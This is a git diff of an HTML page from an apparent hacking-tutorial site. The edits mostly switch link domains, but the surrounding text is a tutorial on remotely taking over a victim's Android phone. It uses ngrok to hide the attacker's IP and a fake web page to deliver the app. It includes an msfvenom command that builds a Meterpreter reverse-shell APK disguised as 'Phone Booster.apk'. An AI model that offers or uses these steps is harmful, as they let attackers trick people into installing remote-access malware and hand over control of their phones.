@@ -1,6 +1,6 @@
 <html>
 	<head>
-		<link rel="icon" href="https://vulnx.in/favicon.png">
+		<link rel="icon" href="https://vulnx.github.io/favicon.png">
 		<script data-ad-client="ca-pub-6203666289882469" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 		<meta name="viewport" content="width=device-width, initial-scale=1.0">
 		<link rel="stylesheet" href="style.css"/>
@@ -22,10 +22,10 @@
 
 	<ul class="topnav"><div class="x">
 		<img id="logo" src="../../logo.png" onclick="reveal()">
-		<div style="display: flex; justify-content: row-reverse; align-items: center;"><li><a target="_blank" href="https://vulnx.in/">Home</a></li>
-			<li><a target="_blank" href="https://vulnx.in/Contents/resources.html">Resources</a></li>
-			<li><a target="_blank" href="https://vulnx.in/Contents/tutorials.html">Tutorials</a></li>
-			<li><a target="_blank" href="https://vulnx.in/Contents/CTFs.html">CTFs</a></li></div>
+		<div style="display: flex; justify-content: row-reverse; align-items: center;"><li><a target="_blank" href="https://vulnx.github.io/">Home</a></li>
+			<li><a target="_blank" href="https://vulnx.github.io/Contents/resources.html">Resources</a></li>
+			<li><a target="_blank" href="https://vulnx.github.io/Contents/tutorials.html">Tutorials</a></li>
+			<li><a target="_blank" href="https://vulnx.github.io/Contents/CTFs.html">CTFs</a></li></div>
 		</div>
 	</ul>
 	
@@ -59,12 +59,12 @@
 
 				Ever heard of Port Forwarding ??!! In short, the only thing you need to know [ at least for this tutorial ] is that, port forwarding is a technique which is most commanly used for making services [ msf handler in our case ] on a host of a protected network [ i.e the Hacker's network ], publicly available to the host on the external network [ i.e the Victim's network ]. Therefore basically we can get a reverse connection through the internet to our PC. Now you can try using your router's settings to enable port forwarding and set up custom IPv4 and ports, however, I prefer NOT doing that, because if you do this you will need to put your public IP in the apk as LHOST. If someone gets hold of that apk file and decompiles it, he can extract your public IP out of that [ it is a tedious process but not impossible ]. So it's better if you use a service like NGROK. If you use a service like NGROK, your public IP will be hidden by placing the NGROK servers in the LHOST.<br><br>
 
-				So this means that we can basically make the apk send a reverse connection to the NGROK servers which will forward the traffic to our local computer. To set-up NGROK you can read my tutorial by simply clicking <a href="https://www.vulnx.in/General%20Hacking/Android%20Hacking/port_forwarding_with_ngrok.html"><font color="#05f">here</font></a>, or alternatively you can visit ther site <a href="https://www.ngrok.com"><font color="#05f">ngrok.com</font></a>
+				So this means that we can basically make the apk send a reverse connection to the NGROK servers which will forward the traffic to our local computer. To set-up NGROK you can read my tutorial by simply clicking <a href="https://www.vulnx.github.io/General%20Hacking/Android%20Hacking/port_forwarding_with_ngrok.html"><font color="#05f">here</font></a>, or alternatively you can visit ther site <a href="https://www.ngrok.com"><font color="#05f">ngrok.com</font></a>
 					
 				<h1><u>STEP 2 - Generating the payload</u></h1>
 
 				
-				Now before we generate the payload, we must configure our ngrok.yaml file. I have already configured it but, in case you haven't then you can do it by reading this <a href="https://www.vulnx.in/General%20Hacking/Android%20Hacking/port_forwarding_with_ngrok.html"><font color="#05f">tutorial</font></a>. <br><br>
+				Now before we generate the payload, we must configure our ngrok.yaml file. I have already configured it but, in case you haven't then you can do it by reading this <a href="https://www.vulnx.github.io/General%20Hacking/Android%20Hacking/port_forwarding_with_ngrok.html"><font color="#05f">tutorial</font></a>. <br><br>
 				
 				Once you successfully configure ngrok, you can start all tunnels by typing 'ngrok start --all' and hit enter.
 
@@ -72,7 +72,7 @@
 					<img src="images/hack_android_wan_ngrok.png" class="responsive">
 				</div><br>
 
-				As you can see, '0.tcp.ngrok.io' is the hostname which is forwarded to localhost at 1501 through port 14745. Got confused??! This is not the time to get confused, basically, any traffic coming through the tcp protocol at 0.tcp.ngrok.io on port number 14735 will be forwarded to localhost at port 1501, and 'https://93c014cd.ngrok.io' will be forwarding traffic to localhost at port 80 [ to our fake apache2 page ]. Now make sure that you have set-up active apache2 page, if you are not sure the check out the <a href="../../../../../../../../../General Hacking/Android Hacking/hack_android.html"><font color=#05f>previous</font></a> tutorial, where I explained how to can set-up the apache2 page or you can alternatively use my <a href="https://www.vulnx.in/Contents/General%20Hacking/Android%20Hacking/auto_setup_apache2"><font color="#05f">script</font></a> directly [ If you already have an existing apache2 page, make sure that you back-up that first ]. Once that is over we can create a payload by using the following command
+				As you can see, '0.tcp.ngrok.io' is the hostname which is forwarded to localhost at 1501 through port 14745. Got confused??! This is not the time to get confused, basically, any traffic coming through the tcp protocol at 0.tcp.ngrok.io on port number 14735 will be forwarded to localhost at port 1501, and 'https://93c014cd.ngrok.io' will be forwarding traffic to localhost at port 80 [ to our fake apache2 page ]. Now make sure that you have set-up active apache2 page, if you are not sure the check out the <a href="../../../../../../../../../General Hacking/Android Hacking/hack_android.html"><font color=#05f>previous</font></a> tutorial, where I explained how to can set-up the apache2 page or you can alternatively use my <a href="https://www.vulnx.github.io/Contents/General%20Hacking/Android%20Hacking/auto_setup_apache2"><font color="#05f">script</font></a> directly [ If you already have an existing apache2 page, make sure that you back-up that first ]. Once that is over we can create a payload by using the following command
 
 				<ul><div id="new5">
 					msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=[PORT_NUMBER] -o Phone Booster.apk
